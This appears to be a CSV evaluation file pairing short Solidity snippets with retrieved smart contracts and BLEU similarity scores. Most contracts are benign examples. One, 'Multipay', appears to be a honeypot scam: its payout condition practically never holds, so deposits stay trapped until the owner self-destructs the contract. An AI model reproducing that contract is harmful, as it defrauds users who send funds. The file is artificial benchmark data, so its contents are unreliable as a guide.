sni,bleu,code
"contract myContract {
    foreignContract created;

    function myContract() {
        created = foreignContract(msg.sender);
    }

    function changeNameMycontract(string name) returns(bool, address) {
        return (created.changeName(name), msg.sender);    
    }

    function ReturnName()returns(string) {
        return created.receiveName();
    }
}",0.5327062814111899,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hash(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract Proof { 
    function register(bytes32 hash) { 
        if (hashToDate[hash] != 0) return; 
        hashToDate[hash] = now; 

    } 
    function dateOf(bytes32 hash) constant returns (uint date) { 
        return hashToDate[hash]; 

    } 
    mapping (bytes32 => uint) hashToDate; 
}",0.5735530150491688,"contract Dates {
    uint constant DAY_IN_SECONDS = 86400;

    function getNow() public view returns(uint) {
        return now;
    }

    function getDelta(uint _date) public view returns(uint) {
        
        return (now / DAY_IN_SECONDS) - (_date / DAY_IN_SECONDS);
    }
}"
"contract B is A {
    function doSmth() {
        super.doSmth();
        
    }
}",0.558024933102482,"contract OBOK 

{

    function donateDivs() public payable;

}"
"contract Test1 {

   struct Car {
       string carCreationDate;
       string carOrigin;
       address carOwner;
   }

   mapping(uint => Car) public CarStruct;

   function setNewCar(string memory _carCreationDate, string memory _carOrigin, address _carOwner) public returns(uint) {
       uint carId = uint(keccak256(abi.encodePacked(msg.sender, now)));
       CarStruct[carId].carCreationDate = _carCreationDate;
       CarStruct[carId].carOrigin = _carOrigin;
       CarStruct[carId].carOwner = _carOwner;
       return carId;
   }
}",0.5607330529591025,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Foo {
    uint256 public x;
    MyContract myContract;
    address myContractAddress;

    constructor(address _myContractAddress) public {
        myContractAddress = _myContractAddress;
    }

    function baz() public {
        myContract = MyContract(myContractAddress);
        x = myContract.baz();
    }
}",0.5502650706543255,"contract DepositContract {

    MainDepositContract public _main_contract;

    uint256 public _user_id;



    constructor(uint256 user_id) public {

        _user_id = user_id;

        _main_contract = MainDepositContract(msg.sender);

    }



    function () external payable {

        _main_contract.log_deposit.value(msg.value)(_user_id);

    }

}"
"contract TestContract1 {
        uint public n;
        uint public testValue1;
        bytes6 public value;

        function TestContract1(bytes6 val, uint[] testArray) {
                n = testArray.length;
                testValue1 = testArray[0];
                value = val;
        }
}",0.5814448133002244,"contract ERC20{

    function transfer(address _to, uint256 _value) public;

    function transferFrom(address _from, address _to, uint256 _value) public;

    function approve(address spender, uint tokens) public;

}"
"contract ProductContract {  
    using DataSet for *;  
    DataSet.Data d;  
    mapping (uint => uint) IDToVal;  
    function register (uint p_id, uint val) returns (bool registered) {  
        IDToVal[p_id] = val;  
        registered = true;  
    }  
    function getVal (uint p_id) returns (uint v) {  
         return IDToVal[p_id];  
    }  
}",0.5820907048812869,"contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
    function deposit(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
    function withdraw(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
}"
"contract Sender {
    event sent(
        address indexed escrowAddress
    );
    
    function sendEth() external payable{
        Escrow escrow = new Escrow();
        
        address payable _payableEscrow = address(uint160(address(escrow)));
        _payableEscrow.transfer(msg.value);
        
        emit sent(_payableEscrow);
    }
}",0.5687368896694249,"contract Multipay

{

    address hodl = msg.sender;

    function() external payable {}

    function end() public {

        if (msg.sender==hodl)

            selfdestruct(msg.sender);

    }

    function release() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract Experment2 {
uint public creationTime = now;
struct Record {
  
   
   string name;
   string senderaddress;
   string reciveraddress;
   string scheduletime;
   string scheduledate;
  
   uint time;
}
mapping (uint => Record[]) records;


function setRec (uint id, string name, string senderaddress, string reciveraddress, string scheduletime, string scheduledate, uint time) public {
     records[id].push(Record(name, senderaddress, reciveraddress, scheduletime, scheduledate, time =now));
}

function getrec(uint id , uint index) constant returns(string, string, string, string, string, uint){ {
    var a = records[id][index].name;
    var b = records[id][index].senderaddress;
    var c = records[id][index].reciveraddress;
    var d = records[id][index].scheduletime;
    var e = records[id][index].scheduledate;
    var f = records[id][index].time;

}
return(a,b,c,d,e,f);
}


function get_last_ten(uint id) constant returns (uint[10]){
    
    uint[10] memory lastItem2;
    for(uint i=0;i<10;i++){
        if(records[id].length>i){
          
            lastItem2[i] = records[id][records[id].length-i-1].time;
        }
    }
    return (lastItem2);
}
}",0.5642714184329849,"contract COS is ERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor () public {
        _name = ""COS"";
        _symbol = ""COS"";
        _decimals = 18;
        _totalSupply = 200e6 * 10**18; 
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
    }

    
    function airdrop(address[] calldata _recipients, uint256[] calldata _values) external returns (bool) {
        require(_recipients.length == _values.length, ""Inconsistent data lengths"");
        uint256 senderBalance = _balances[msg.sender];
        uint256 length = _values.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 value = _values[i];
            address to = _recipients[i];
            require(senderBalance >= value, ""Insufficient Balance"");
            require(to != address(0), ""Address is Null"");
            if (msg.sender != _recipients[i])  {      
                transfer(to, value);
            }
        }
        return true;            
    }

    

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract Example_bytes {
    bytes[] list;
    function insertHash(bytes ipfsHash) {
       list.push(ipfsHash); 
    }
}",0.5295020561635352,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract Example_string {
    struct hashes{
         string hash;
    }

    hashes[] list;
    function insertHash(string ipfsHash) {
       list.push(hashes{hash: ipfsHash); 
    }
}",0.5056733803995863,"contract VerificationStorage {

    event Verification(bytes ipfsHash);



    function verify(bytes _ipfsHash) public {

        emit Verification(_ipfsHash);

    }

}"
